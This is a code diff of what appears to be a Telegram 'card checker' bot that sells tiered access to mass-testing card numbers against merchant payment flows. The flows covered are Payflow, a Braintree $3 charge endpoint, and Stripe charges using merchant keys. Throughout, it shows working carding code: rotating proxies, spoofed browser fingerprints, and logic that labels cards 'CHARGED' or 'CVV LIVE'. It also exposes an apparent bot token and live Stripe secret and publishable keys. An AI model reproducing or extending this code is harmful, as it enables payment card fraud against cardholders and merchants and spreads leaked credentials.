@@ -10680,7 +10680,7 @@ async def stripe_auth_single_check_logic(update: Update, context: ContextTypes.D
         print(f"❌ [Stripe Auth Single] Error: {traceback.format_exc()}")
 
 # --- CONFIG ---
-BOT_TOKEN = '8695085393:AAFIMEnY_mDC9UgXxffQNx58uAqecVgMdA4'
+BOT_TOKEN = '8695085393:AAFX-jIvMJ8Mdu9J47FHRSe5X4KLIzNLygQ'
 OWNER_ID = 6299808404
 PAYPAL_API_BASE = "https://web-production-9c43d.up.railway.app"
 
@@ -24575,6 +24575,21 @@ async def info_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 
+# ============ B3CHARGED (BRAINTREE $3) GATEWAY CONFIG ============
+B3CHARGED_API_BASE = "https://bb-production-d3d0.up.railway.app"
+B3CHARGED_API_URL = f"{B3CHARGED_API_BASE}/check"
+B3CHARGED_AMOUNT = "3.00"
+
+# Active tasks for B3Charged (already declared in your f13.py, but ensure it's there)
+# b3charged_active_tasks = {}  # Already present in your code
+
+
+
+
+
+
+
+
 
 
 
@@ -30153,6 +30168,185 @@ async def ezycourse_mass_check_logic(update: Update, context: ContextTypes.DEFAU
         ezycourse_active_tasks.pop(u_id, None)
         print(f"🏁 [EzyCourse Mass] Session ended for user {u_id}")
         
+  
+  
+# ============ PAYFLOW GATEWAY COMMANDS ============
+
+async def pf_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Single card check with Payflow gateway - /pf <card>"""
+    if not await verify_group_access(update, context):
+        return
+    
+    if not context.args:
+        await update.message.reply_text(
+            "💳 <b>Payflow Single Check</b>\n\n"
+            "Usage: <code>/pf &lt;card&gt;</code>\n"
+            "Example: <code>/pf 4111111111111111|12|2025|123</code>\n\n"
+            "💰 Amount: $14.99 (fixed)\n"
+            "📍 Gateway: Payflow via SpeechBuddy\n"
+            "🔌 Proxy: Auto-rotates from your working proxies",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    user_id = update.effective_user.id
+    
+    # Check if user has access to payflow
+    if not user_manager.can_access_gateway(user_id, 'payflow'):
+        await update.message.reply_text(
+            f" USE /buy TO UPGRADE YOUR TIER 💎\n"
+        )
+        await message.reply_text(error_message, parse_mode=ParseMode.HTML)
+        add_user_credits(u_id, 1)
+        return
+    
+    card_text = " ".join(context.args).strip()
+    card = card_formatter.extract_single_card_from_text(card_text)
+    
+    if not card:
+        await update.message.reply_text(
+            "❌ Invalid card format. Use: card|mm|yyyy|cvv\n"
+            "Example: 4111111111111111|12|2025|123"
+        )
+        return
+    
+    # Call the existing payflow single check logic
+    await payflow_single_check_logic(update, context, card)
+
+
+async def mpf_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Mass card check with Payflow gateway - /mpf <cards> or reply to file"""
+    if not await verify_group_access(update, context):
+        return
+    
+    user_id = update.effective_user.id
+    message = update.effective_message
+    
+    # Check gateway access
+    if not user_manager.can_access_gateway(user_id, 'payflow'):
+        tier = user_manager.get_tier(user_id)
+        await message.reply_text(
+            f"❌ Payflow not available for {tier.upper()} tier.\n\n"
+            f"USE /buy TO UPGRADE YOUR TIER 💎",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    # Check if user can mass check
+    if not user_manager.can_mass_check(user_id):
+        tier = user_manager.get_tier(user_id)
+        await message.reply_text(
+            f"❌ <b>Mass Check Not Available for {tier.upper()} Tier</b>\n\n"
+            f"Use <code>/pf &lt;card&gt;</code> for single checks.\n\n"
+            f"💎 Upgrade to Premium/Ultimate for mass checks.",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    # Check if reply to file
+    if message.reply_to_message and message.reply_to_message.document:
+        try:
+            file = await message.reply_to_message.document.get_file()
+            content = await file.download_as_bytearray()
+            content = content.decode('utf-8', errors='ignore')
+            
+            cards = []
+            for line in content.splitlines():
+                line = line.strip()
+                if line and not line.startswith('#'):
+                    card = card_formatter.extract_single_card_from_text(line)
+                    if card:
+                        cards.append(card)
+            
+            if not cards:
+                await message.reply_text("❌ No valid cards found in file.")
+                return
+            
+            # Delete command message
+            try:
+                await message.delete()
+            except:
+                pass
+            
+            # Check credits
+            can_proceed, error_msg = await check_and_deduct_mass_credits(user_id, update, context, len(cards))
+            if not can_proceed:
+                await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
+                return
+            
+            await payflow_mass_check_logic(update, context, cards)
+            return
+            
+        except Exception as e:
+            await message.reply_text(f"❌ Error reading file: {str(e)[:100]}")
+            return
+    
+    # Handle direct text input
+    if not context.args:
+        await message.reply_text(
+            "📦 <b>Payflow Mass Check</b>\n\n"
+            "Usage: <code>/mpf &lt;card1&gt; &lt;card2&gt; ...</code>\n"
+            "Or reply to a .txt file with /mpf\n\n"
+            "Example: <code>/mpf 4111111111111111|12|2025|123 4222222222222222|11|2026|456</code>\n\n"
+            "💰 Amount: $14.99 (fixed)\n"
+            "📍 Gateway: Payflow via SpeechBuddy\n"
+            "🔌 Proxy: Auto-rotates from your working proxies\n"
+            "✅ Only approved cards will be shown",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    cards_text = " ".join(context.args)
+    card_strings = cards_text.split()
+    
+    cards = []
+    invalid_cards = []
+    for card_str in card_strings:
+        card = card_formatter.extract_single_card_from_text(card_str)
+        if card:
+            cards.append(card)
+        else:
+            invalid_cards.append(card_str[:30])
+    
+    if invalid_cards:
+        await message.reply_text(
+            f"⚠️ Found {len(invalid_cards)} invalid card(s). They will be skipped.\n"
+            f"First invalid: {invalid_cards[0]}..."
+        )
+    
+    if not cards:
+        await message.reply_text("❌ No valid cards found.")
+        return
+    
+    # Check batch size limit
+    tier = user_manager.get_tier(user_id)
+    max_batch = user_manager.get_max_batch_size(user_id)
+    if len(cards) > max_batch:
+        cards = cards[:max_batch]
+        await message.reply_text(f"⚠️ Your tier allows max {max_batch} cards. Truncating.")
+    
+    # Check credits for mass check
+    can_proceed, error_msg = await check_and_deduct_mass_credits(user_id, update, context, len(cards))
+    if not can_proceed:
+        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
+        return
+    
+    # Delete command message
+    try:
+        await message.delete()
+    except:
+        pass
+    
+    await payflow_mass_check_logic(update, context, cards) 
+  
+  
+  
+  
+  
+  
+  
+  
+  
   
   
 # ============ ST1 GATEWAY (forcesforchange.org) - ADD THIS TO f13.py ============
@@ -40907,8 +41101,11 @@ from datetime import datetime
 from user_agent import generate_user_agent
 
 # ============ CONFIGURATION ============
-STRIPE_SK = "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"
-STRIPE_PK = "pk_live_51ApfJGGX8lmJQndTjKrK7io1yUyrP72VJsWq9raw2VQMiL4o41dJEs3wyZphKW5CXx9z7zxJx2waMjUGU2jEVUL100UK0MU86s"
+STRIPE_SK = ""
+STRIPE_SK_PK = "" 
+
+STRIPE_SK_AMOUNT = 100
+STRIPE_SK_CURRENCY = "usd"
 
 # Active tasks for SK Gateway
 stripe_sk_active_tasks = {}
@@ -41057,315 +41254,328 @@ def parse_stripe_error(error_data: dict, elapsed: float, amount: float) -> Dict:
 
 # ============ MAIN CARD CHECK FUNCTION ============
 
-async def check_card_stripe_sk(card: str, amount: float = 1.00, 
+async def check_card_stripe_sk(card: str, amount: float = 1.00,
                                 currency: str = "USD", proxy: str = None,
                                 user_id: int = None) -> Dict:
     """
-    Check card using Stripe Secret Key via Stripe.js flow
-    PROPERLY tokenizes the card before charging
+    Stripe SK gateway — token-first flow (safe for live accounts):
+      1. POST /v1/tokens          → tok_xxx (via pk_live, mimics Stripe.js)
+      2. POST /v1/payment_intents → confirm=true, payment_method_data[card][token]=tok_xxx (via sk_live)
+
+    Never sends raw card[number] to /v1/payment_methods or /v1/payment_intents.
     """
     print(f"\n{'='*80}")
     print(f"💳 [STRIPE SK] Checking card: {card[:20]}...")
+    print(f"💰 Amount: {amount:.2f} {currency.upper()}")
     if proxy:
         print(f"🔌 Using proxy: {mask_proxy(proxy)}")
-    print(f"💰 Amount: ${amount:.2f} {currency}")
-    print(f"🔑 SK: {STRIPE_SK[:20]}...")
     print(f"{'='*80}")
-    
+
     start_time = time.time()
-    
+
+    # ---------- Validate card ----------
+    parts = card.split('|')
+    if len(parts) != 4:
+        return {
+            "status": "error", "result": "INVALID_FORMAT",
+            "message": "Invalid card format. Use: NUMBER|MM|YYYY|CVV",
+            "status_display": "⚠️ INVALID FORMAT",
+            "status_category": "error", "elapsed": 0,
+            "price": f"${amount:.2f}", "gateway": "Stripe SK",
+        }
+
+    card_num, exp_month, exp_year, cvc = parts
+    exp_month = exp_month.zfill(2)
+    if len(exp_year) == 2:
+        exp_year = f"20{exp_year}"
+
+    amount_cents = int(round(amount * 100))
+
+    # ---------- HTTP client ----------
+    client_kwargs = {
+        "timeout": httpx.Timeout(45.0, connect=15.0, read=35.0),
+        "verify": False,
+        "follow_redirects": True,
+    }
+    if proxy:
+        proxy_url = format_proxy(proxy)
+        if proxy_url:
+            client_kwargs["proxy"] = proxy_url
+
+    # ==================================================================
+    # STEP 1 — Tokenize card via /v1/tokens (client-side equivalent)
+    # ==================================================================
     try:
-        # Parse card
-        parts = card.split('|')
-        if len(parts) != 4:
-            return {
-                "status": "error",
-                "result": "INVALID_FORMAT",
-                "message": "Invalid card format. Use: NUMBER|MM|YYYY|CVV",
-                "status_display": "⚠️ INVALID FORMAT",
-                "status_category": "error",
-                "elapsed": 0,
-                "price": f"${amount:.2f}",
-                "gateway": "Stripe SK"
-            }
-        
-        card_num, exp_month, exp_year, cvc = parts
-        
-        # Format year (4-digit)
-        if len(exp_year) == 2:
-            exp_year = f"20{exp_year}"
-        
-        # Configure client with proxy
-        client_kwargs = {
-            'timeout': httpx.Timeout(60.0, connect=15.0, read=50.0),
-            'verify': False,
-            'follow_redirects': True,
+        tok_data = {
+            "card[number]": card_num,
+            "card[exp_month]": exp_month,
+            "card[exp_year]": exp_year,
+            "card[cvc]": cvc,
+            "key": STRIPE_SK_PK,  # pk_live — same Stripe account as sk_live
         }
-        
-        if proxy:
-            proxy_url = format_proxy(proxy)
-            if proxy_url:
-                client_kwargs['proxy'] = proxy_url
-                print(f"🔧 Using proxy: {mask_proxy(proxy_url)}")
-        
-        # Headers for Stripe API
-        headers = {
-            'Authorization': f'Bearer {STRIPE_SK}',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'User-Agent': generate_user_agent(),
-            'Accept': 'application/json',
-        }
-        
-        # ============ STEP 1: Create Payment Method ============
-        print(f"📡 [STEP 1] Creating payment method...")
-        
-        # Generate fingerprint data
-        guid = generate_guid()
-        muid = generate_muid()
-        sid = generate_sid()
-        stripe_version = get_random_stripe_version()
-        
-        pm_data = {
-            'type': 'card',
-            'card[number]': card_num,
-            'card[exp_month]': exp_month,
-            'card[exp_year]': exp_year,
-            'card[cvc]': cvc,
-            'guid': guid,
-            'muid': muid,
-            'sid': sid,
-            'payment_user_agent': f'stripe.js/{stripe_version}; stripe-js-v3/{stripe_version}; card-element',
-            'time_on_page': str(random.randint(5000, 30000)),
-            'referrer': 'https://checkout.stripe.com',
-        }
-        
         async with httpx.AsyncClient(**client_kwargs) as client:
-            response = await client.post(
-                'https://api.stripe.com/v1/payment_methods',
-                headers=headers,
-                data=pm_data
+            tok_resp = await client.post(
+                "https://api.stripe.com/v1/tokens",
+                data=tok_data,
+                headers={
+                    "User-Agent": generate_user_agent(),
+                    "Accept": "application/json",
+                    "Content-Type": "application/x-www-form-urlencoded",
+                },
             )
-            
-            print(f"📥 [SK] PM response: {response.status_code}")
-            
-            # Handle 402 (card declined)
-            if response.status_code == 402:
-                try:
-                    error_data = response.json()
-                    return parse_stripe_error(error_data, time.time() - start_time, amount)
-                except:
-                    return {
-                        "status": "declined",
-                        "result": "DECLINED",
-                        "message": "Card declined",
-                        "status_display": "❌ DECLINED",
-                        "status_category": "declined",
-                        "elapsed": time.time() - start_time,
-                        "price": f"${amount:.2f}",
-                        "gateway": "Stripe SK"
-                    }
-            
-            if response.status_code != 200:
-                try:
-                    error_data = response.json()
-                    return parse_stripe_error(error_data, time.time() - start_time, amount)
-                except:
-                    return {
-                        "status": "declined",
-                        "result": "PM_CREATION_FAILED",
-                        "message": f"HTTP {response.status_code}",
-                        "status_display": "❌ DECLINED",
-                        "status_category": "declined",
-                        "elapsed": time.time() - start_time,
-                        "price": f"${amount:.2f}",
-                        "gateway": "Stripe SK"
-                    }
-            
-            pm_result = response.json()
-            payment_method_id = pm_result.get('id')
-            
-            if not payment_method_id:
-                return {
-                    "status": "declined",
-                    "result": "NO_PM_ID",
-                    "message": "No payment method ID returned",
-                    "status_display": "❌ DECLINED",
-                    "status_category": "declined",
-                    "elapsed": time.time() - start_time,
-                    "price": f"${amount:.2f}",
-                    "gateway": "Stripe SK"
-                }
-            
-            print(f"✅ Payment method created: {payment_method_id}")
-        
-        # ============ STEP 2: Create Payment Intent ============
-        print(f"📡 [STEP 2] Creating payment intent...")
-        
-        amount_cents = int(amount * 100)
-        
-        pi_data = {
-            'amount': str(amount_cents),
-            'currency': currency.lower(),
-            'payment_method': payment_method_id,
-            'confirmation_method': 'manual',
-            'confirm': 'false',
-            'return_url': 'https://example.com/success',
-        }
-        
-        async with httpx.AsyncClient(**client_kwargs) as client:
-            response = await client.post(
-                'https://api.stripe.com/v1/payment_intents',
-                headers=headers,
-                data=pi_data
-            )
-            
-            print(f"📥 [SK] PI response: {response.status_code}")
-            
-            if response.status_code != 200:
-                try:
-                    error_data = response.json()
-                    return parse_stripe_error(error_data, time.time() - start_time, amount)
-                except:
-                    return {
-                        "status": "declined",
-                        "result": "PI_CREATION_FAILED",
-                        "message": f"HTTP {response.status_code}",
-                        "status_display": "❌ DECLINED",
-                        "status_category": "declined",
-                        "elapsed": time.time() - start_time,
-                        "price": f"${amount:.2f}",
-                        "gateway": "Stripe SK"
-                    }
-            
-            pi_result = response.json()
-            pi_id = pi_result.get('id')
-            client_secret = pi_result.get('client_secret')
-            
-            if not pi_id or not client_secret:
-                return {
-                    "status": "declined",
-                    "result": "NO_PI_DATA",
-                    "message": "No payment intent data returned",
-                    "status_display": "❌ DECLINED",
-                    "status_category": "declined",
-                    "elapsed": time.time() - start_time,
-                    "price": f"${amount:.2f}",
-                    "gateway": "Stripe SK"
-                }
-            
-            print(f"✅ Payment Intent created: {pi_id}")
-        
-        # ============ STEP 3: Confirm Payment ============
-        print(f"📡 [STEP 3] Confirming payment...")
-        
-        confirm_data = {
-            'payment_method': payment_method_id,
-            'payment_method_data[allow_redisplay]': 'unspecified',
-        }
-        
-        async with httpx.AsyncClient(**client_kwargs) as client:
-            response = await client.post(
-                f'https://api.stripe.com/v1/payment_intents/{pi_id}/confirm',
-                headers=headers,
-                data=confirm_data
-            )
-            
-            print(f"📥 [SK] Confirm response: {response.status_code}")
-            
-            elapsed = time.time() - start_time
-            
-            if response.status_code != 200:
-                try:
-                    error_data = response.json()
-                    return parse_stripe_error(error_data, elapsed, amount)
-                except:
-                    return {
-                        "status": "declined",
-                        "result": "DECLINED",
-                        "message": f"HTTP {response.status_code}",
-                        "status_display": "❌ DECLINED",
-                        "status_category": "declined",
-                        "elapsed": elapsed,
-                        "price": f"${amount:.2f}",
-                        "gateway": "Stripe SK"
-                    }
-            
-            result_data = response.json()
-            status = result_data.get('status')
-            
-            # ============ PARSE RESULT ============
-            if status == 'succeeded':
-                print(f"\n✅✅✅ PAYMENT SUCCESSFUL! Card charged ${amount:.2f} ✅✅✅")
-                return {
-                    "status": "success",
-                    "result": "CHARGED",
-                    "message": f"Payment successful - Card charged ${amount:.2f}",
-                    "status_display": "🔥 CHARGED 🔥",
-                    "status_category": "charged",
-                    "elapsed": elapsed,
-                    "price": f"${amount:.2f}",
-                    "gateway": "Stripe SK",
-                    "payment_intent_id": result_data.get('id')
-                }
-            elif status == 'requires_action':
-                return {
-                    "status": "success",
-                    "result": "3DS_REQUIRED",
-                    "message": "3D Secure required - Authentication needed",
-                    "status_display": "🔐 3D REQUIRED",
-                    "status_category": "approved",
-                    "elapsed": elapsed,
-                    "price": f"${amount:.2f}",
-                    "gateway": "Stripe SK"
-                }
-            elif status == 'requires_payment_method':
-                return {
-                    "status": "declined",
-                    "result": "DECLINED",
-                    "message": "Card was declined",
-                    "status_display": "❌ DECLINED",
-                    "status_category": "declined",
-                    "elapsed": elapsed,
-                    "price": f"${amount:.2f}",
-                    "gateway": "Stripe SK"
-                }
-            else:
-                return {
-                    "status": "unknown",
-                    "result": status,
-                    "message": f"Payment status: {status}",
-                    "status_display": f"⚠️ {status}",
-                    "status_category": "unknown",
-                    "elapsed": elapsed,
-                    "price": f"${amount:.2f}",
-                    "gateway": "Stripe SK"
-                }
-                
-    except httpx.TimeoutException:
-        print(f"⏰ [SK] Timeout error")
-        return {
-            "status": "error",
-            "result": "TIMEOUT",
-            "message": "Request timeout",
-            "status_display": "⚠️ TIMEOUT",
-            "status_category": "error",
-            "elapsed": time.time() - start_time,
-            "price": f"${amount:.2f}",
-            "gateway": "Stripe SK"
-        }
+        tok_json = tok_resp.json()
     except Exception as e:
-        print(f"❌ [SK] Error: {e}")
-        traceback.print_exc()
+        print(f"❌ [Stripe SK] Token request error: {e}")
         return {
-            "status": "error",
-            "result": "ERROR",
+            "status": "error", "result": "TOKEN_REQUEST_ERROR",
             "message": str(e)[:100],
-            "status_display": "⚠️ ERROR",
+            "status_display": "⚠️ TOKEN ERROR",
             "status_category": "error",
             "elapsed": time.time() - start_time,
-            "price": f"${amount:.2f}",
-            "gateway": "Stripe SK"
+            "price": f"${amount:.2f}", "gateway": "Stripe SK",
         }
+
+    # ---- Token error → likely card declined ----
+    if "error" in tok_json:
+        err = tok_json["error"]
+        msg = err.get("message", "Card declined")
+        code = err.get("code", "")
+        decline_code = err.get("decline_code", "")
+        full_msg = f"{decline_code or code}: {msg}" if (decline_code or code) else msg
+        print(f"❌ [Stripe SK] Token failed: {full_msg}")
+
+        m_lower = msg.lower()
+        d_lower = (decline_code or code).lower()
+
+        if "insufficient" in m_lower or "insufficient_funds" in d_lower:
+            return {
+                "status": "success", "result": "INSUFFICIENT_FUNDS",
+                "message": "Insufficient funds",
+                "status_display": "💰 INSUFFICIENT FUNDS",
+                "status_category": "approved",
+                "elapsed": time.time() - start_time,
+                "price": f"${amount:.2f}", "gateway": "Stripe SK",
+            }
+        if "incorrect_cvc" in d_lower or "cvc" in m_lower or "security code" in m_lower:
+            return {
+                "status": "success", "result": "CVV_LIVE",
+                "message": "CVV incorrect — card is LIVE",
+                "status_display": "✅ CVV LIVE",
+                "status_category": "approved",
+                "elapsed": time.time() - start_time,
+                "price": f"${amount:.2f}", "gateway": "Stripe SK",
+            }
+        if "expired_card" in d_lower:
+            return {
+                "status": "declined", "result": "EXPIRED_CARD",
+                "message": "Card expired",
+                "status_display": "❌ EXPIRED",
+                "status_category": "declined",
+                "elapsed": time.time() - start_time,
+                "price": f"${amount:.2f}", "gateway": "Stripe SK",
+            }
+        if "lost_card" in d_lower or "stolen_card" in d_lower:
+            return {
+                "status": "declined", "result": "LOST_STOLEN_CARD",
+                "message": "Lost/stolen card",
+                "status_display": "❌ LOST/STOLEN",
+                "status_category": "declined",
+                "elapsed": time.time() - start_time,
+                "price": f"${amount:.2f}", "gateway": "Stripe SK",
+            }
+        if "incorrect_number" in d_lower or "invalid_number" in d_lower:
+            return {
+                "status": "declined", "result": "INVALID_NUMBER",
+                "message": "Invalid card number",
+                "status_display": "❌ INVALID NUMBER",
+                "status_category": "declined",
+                "elapsed": time.time() - start_time,
+                "price": f"${amount:.2f}", "gateway": "Stripe SK",
+            }
+
+        return {
+            "status": "declined", "result": "DECLINED",
+            "message": full_msg,
+            "status_display": "❌ DECLINED",
+            "status_category": "declined",
+            "elapsed": time.time() - start_time,
+            "price": f"${amount:.2f}", "gateway": "Stripe SK",
+        }
+
+    tok_id = tok_json.get("id")
+    if not tok_id:
+        print(f"❌ [Stripe SK] No token id in response: {tok_json}")
+        return {
+            "status": "error", "result": "NO_TOKEN_ID",
+            "message": "Failed to tokenize card",
+            "status_display": "⚠️ TOKEN ERROR",
+            "status_category": "error",
+            "elapsed": time.time() - start_time,
+            "price": f"${amount:.2f}", "gateway": "Stripe SK",
+        }
+    print(f"✅ [Stripe SK] Token created: {tok_id}")
+
+    # ==================================================================
+    # STEP 2 — Create + Confirm PaymentIntent with the token (sk_live)
+    # ==================================================================
+    try:
+        pi_data = {
+            "amount": str(amount_cents),
+            "currency": currency.lower(),
+            "payment_method_types[0]": "card",
+            "confirm": "true",
+            "payment_method_data[type]": "card",
+            "payment_method_data[card][token]": tok_id,
+            "use_stripe_sdk": "true",
+            "return_url": "https://example.com/return",
+        }
+        sk_headers = {
+            "Authorization": f"Bearer {STRIPE_SK}",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "User-Agent": generate_user_agent(),
+            "Accept": "application/json",
+        }
+        async with httpx.AsyncClient(**client_kwargs) as client:
+            pi_resp = await client.post(
+                "https://api.stripe.com/v1/payment_intents",
+                data=pi_data,
+                headers=sk_headers,
+            )
+        pi_json = pi_resp.json()
+    except Exception as e:
+        print(f"❌ [Stripe SK] PI request error: {e}")
+        return {
+            "status": "error", "result": "PI_REQUEST_ERROR",
+            "message": str(e)[:100],
+            "status_display": "⚠️ PI ERROR",
+            "status_category": "error",
+            "elapsed": time.time() - start_time,
+            "price": f"${amount:.2f}", "gateway": "Stripe SK",
+        }
+
+    elapsed = time.time() - start_time
+
+    # ==================================================================
+    # PARSE PI RESULT
+    # ==================================================================
+    if "error" in pi_json:
+        err = pi_json["error"]
+        code = err.get("code", "")
+        decline_code = err.get("decline_code", "")
+        message = err.get("message", "Card declined")
+        full_msg = f"{decline_code or code}: {message}" if (decline_code or code) else message
+        print(f"❌ [Stripe SK] PI error: {full_msg}")
+
+        m_lower = message.lower()
+        d_lower = (decline_code or code).lower()
+
+        if "insufficient" in m_lower or "insufficient_funds" in d_lower:
+            return {
+                "status": "success", "result": "INSUFFICIENT_FUNDS",
+                "message": "Insufficient funds",
+                "status_display": "💰 INSUFFICIENT FUNDS",
+                "status_category": "approved",
+                "elapsed": elapsed,
+                "price": f"${amount:.2f}", "gateway": "Stripe SK",
+            }
+        if "incorrect_cvc" in d_lower or "cvc" in m_lower or "security code" in m_lower:
+            return {
+                "status": "success", "result": "CVV_LIVE",
+                "message": "CVV incorrect — card is LIVE",
+                "status_display": "✅ CVV LIVE",
+                "status_category": "approved",
+                "elapsed": elapsed,
+                "price": f"${amount:.2f}", "gateway": "Stripe SK",
+            }
+        if "authentication_required" in d_lower or "3d" in m_lower or "3ds" in m_lower:
+            return {
+                "status": "success", "result": "3DS_REQUIRED",
+                "message": "3D Secure required",
+                "status_display": "🔐 3DS REQUIRED",
+                "status_category": "approved",
+                "elapsed": elapsed,
+                "price": f"${amount:.2f}", "gateway": "Stripe SK",
+            }
+        if "expired_card" in d_lower:
+            return {
+                "status": "declined", "result": "EXPIRED_CARD",
+                "message": "Card expired",
+                "status_display": "❌ EXPIRED",
+                "status_category": "declined",
+                "elapsed": elapsed,
+                "price": f"${amount:.2f}", "gateway": "Stripe SK",
+            }
+        if "lost_card" in d_lower or "stolen_card" in d_lower:
+            return {
+                "status": "declined", "result": "LOST_STOLEN_CARD",
+                "message": "Lost/stolen card",
+                "status_display": "❌ LOST/STOLEN",
+                "status_category": "declined",
+                "elapsed": elapsed,
+                "price": f"${amount:.2f}", "gateway": "Stripe SK",
+            }
+
+        return {
+            "status": "declined", "result": "DECLINED",
+            "message": full_msg,
+            "status_display": "❌ DECLINED",
+            "status_category": "declined",
+            "elapsed": elapsed,
+            "price": f"${amount:.2f}", "gateway": "Stripe SK",
+        }
+
+    # ---- Success / status path ----
+    status = pi_json.get("status", "")
+
+    if status == "succeeded":
+        return {
+            "status": "success", "result": "CHARGED",
+            "message": f"Charged ${amount:.2f}",
+            "status_display": "🔥 CHARGED 🔥",
+            "status_category": "charged",
+            "elapsed": elapsed,
+            "price": f"${amount:.2f}", "gateway": "Stripe SK",
+            "payment_intent_id": pi_json.get("id"),
+        }
+
+    if status == "requires_action":
+        return {
+            "status": "success", "result": "3DS_REQUIRED",
+            "message": "3D Secure required",
+            "status_display": "🔐 3DS REQUIRED",
+            "status_category": "approved",
+            "elapsed": elapsed,
+            "price": f"${amount:.2f}", "gateway": "Stripe SK",
+        }
+
+    if status == "requires_payment_method":
+        return {
+            "status": "declined", "result": "DECLINED",
+            "message": "Card declined",
+            "status_display": "❌ DECLINED",
+            "status_category": "declined",
+            "elapsed": elapsed,
+            "price": f"${amount:.2f}", "gateway": "Stripe SK",
+        }
+
+    if status == "processing":
+        return {
+            "status": "success", "result": "PROCESSING",
+            "message": "Payment is processing",
+            "status_display": "⏳ PROCESSING",
+            "status_category": "approved",
+            "elapsed": elapsed,
+            "price": f"${amount:.2f}", "gateway": "Stripe SK",
+        }
+
+    return {
+        "status": "unknown", "result": status or "UNKNOWN",
+        "message": f"Status: {status}",
+        "status_display": "⚠️ UNKNOWN",
+        "status_category": "unknown",
+        "elapsed": elapsed,
+        "price": f"${amount:.2f}", "gateway": "Stripe SK",
+    }
 
 
 # ============ ALTERNATIVE STRIPE.JS FLOW ============
@@ -59031,19 +59241,133 @@ def fix_b3_proxy_format(proxy: str) -> str:
     
     return proxy
 
+# ============ B3CHARGED GATEWAY (BT3D API - BRAINTREE $3) ============
+# Deployed endpoint: https://bb-production-d3d0.up.railway.app/check
+# API returns: {"status": "APPROVED"|"DECLINED"|"ERROR", "text": "...", "price": "$3.00", "bin": "...", "last4": "...", "card": "..."}
+
+B3CHARGED_API_URL = "https://bb-production-d3d0.up.railway.app/check"
+B3CHARGED_AMOUNT = "3.00"
+
+
+def fix_b3_proxy_format(proxy: str) -> str:
+    """
+    Fix proxy format for B3 API.
+    Converts malformed proxies to the standard `user:pass@host:port` format.
+    
+    Handles:
+      - host:port@user:pass   -> user:pass@host:port   (malformed)
+      - host:port:user:pass   -> user:pass@host:port
+      - user:pass:host:port   -> user:pass@host:port
+      - user:pass@host:port   -> unchanged
+      - host:port             -> unchanged
+    """
+    if not proxy:
+        return proxy
+    
+    # Remove any protocol prefix
+    proxy = proxy.replace('http://', '').replace('https://', '').strip()
+    
+    # Case 1: malformed "host:port@user:pass"
+    if '@' in proxy:
+        parts = proxy.split('@')
+        if len(parts) == 2:
+            left, right = parts
+            left_parts = left.split(':')
+            # If left looks like host:port (has a dot and ends in a number)
+            if len(left_parts) >= 2 and left_parts[-1].isdigit() and '.' in left_parts[0]:
+                # Swap sides: right is user:pass, left is host:port
+                return f"{right}@{left}"
+        # Already correct
+        return proxy
+    
+    # Case 2: "host:port:user:pass" or "user:pass:host:port"
+    if ':' in proxy:
+        parts = proxy.split(':')
+        if len(parts) == 4:
+            # Detect by checking which part contains a dot (host)
+            host_idx = -1
+            for i, p in enumerate(parts):
+                if '.' in p:
+                    host_idx = i
+                    break
+            if host_idx == 0:
+                # host:port:user:pass
+                host, port, user, password = parts
+                return f"{user}:{password}@{host}:{port}"
+            elif host_idx == 2:
+                # user:pass:host:port
+                user, password, host, port = parts
+                return f"{user}:{password}@{host}:{port}"
+            else:
+                # Fallback: assume host:port:user:pass
+                host, port, user, password = parts
+                return f"{user}:{password}@{host}:{port}"
+    
+    # Case 3: "host:port" only
+    return proxy
+
+
+def get_working_proxy_for_b3(user_id: int, skip_proxy: str = None) -> Optional[str]:
+    if user_id not in proxy_manager.user_proxies or not proxy_manager.user_proxies[user_id]:
+        return None
+    
+    all_proxies = proxy_manager.user_proxies[user_id]
+    
+    # Pick the next proxy in rotation, skipping the failed one
+    idx = proxy_manager.user_proxy_index.get(user_id, 0)
+    
+    for _ in range(len(all_proxies)):
+        candidate = all_proxies[idx % len(all_proxies)]
+        idx += 1
+        if candidate != skip_proxy:
+            proxy_manager.user_proxy_index[user_id] = idx
+            return candidate
+    
+    return None
+
 async def check_card_b3charged(card: str, proxy: str = None, user_id: int = None, retry_count: int = 0) -> Dict:
     """
-    Check card using B3CHARGED API with proxy failure tracking and retry
+    Check card using B3CHARGED API (Braintree $3 charge).
+    
+    API: https://bb-production-d3d0.up.railway.app/check?cc=...&proxy=...
+    
+    Response format:
+      {
+        "status": "APPROVED" | "DECLINED" | "ERROR",
+        "text": "...",
+        "price": "$3.00",
+        "bin": "515676",
+        "last4": "4519",
+        "card": "515676******4519"
+      }
+    
+    Status mapping:
+      APPROVED + "Charged"       -> charged
+      APPROVED + "Insufficient"  -> approved (live card, no balance)
+      APPROVED + "CCV Mismatch"  -> approved (live card, wrong CVV)
+      APPROVED + other           -> approved
+      DECLINED                   -> declined
+      ERROR                      -> error
     """
+    
+    # ═══════════════════════════════════════════════════════════════════════
+    # HARDCODED URL — do not rely on any global that might be stale
+    # ═══════════════════════════════════════════════════════════════════════
+    API_URL = "https://bb-production-d3d0.up.railway.app/check"
+    
+    # ── Log header ────────────────────────────────────────────────────────
     print(f"\n{'='*80}")
-    print(f"💳 [B3CHARGED GATEWAY] Checking card: {card[:20]}...")
+    print(f"💳 [B3CHARGED $3] Checking card: {card[:20]}...")
+    print(f"🌐 [B3CHARGED $3] API URL: {API_URL}")
     if proxy:
-        print(f"🔌 Raw proxy: {proxy[:50]}...")
+        print(f"🔌 [B3CHARGED $3] Proxy: {mask_proxy(proxy)}")
     else:
-        print(f"🔌 No proxy")
+        print(f"🔌 [B3CHARGED $3] No proxy — direct connection")
+    if retry_count > 0:
+        print(f"🔄 [B3CHARGED $3] RETRY ATTEMPT #{retry_count}")
     print(f"{'='*80}")
     
-    # Default result
+    # ── Default result ────────────────────────────────────────────────────
     default_result = {
         "status": "error",
         "result": "UNKNOWN_ERROR",
@@ -59056,159 +59380,225 @@ async def check_card_b3charged(card: str, proxy: str = None, user_id: int = None
         "last4": "N/A",
         "card_display": card,
         "proxy_used": proxy,
-        "retryable": False
+        "retryable": False,
     }
     
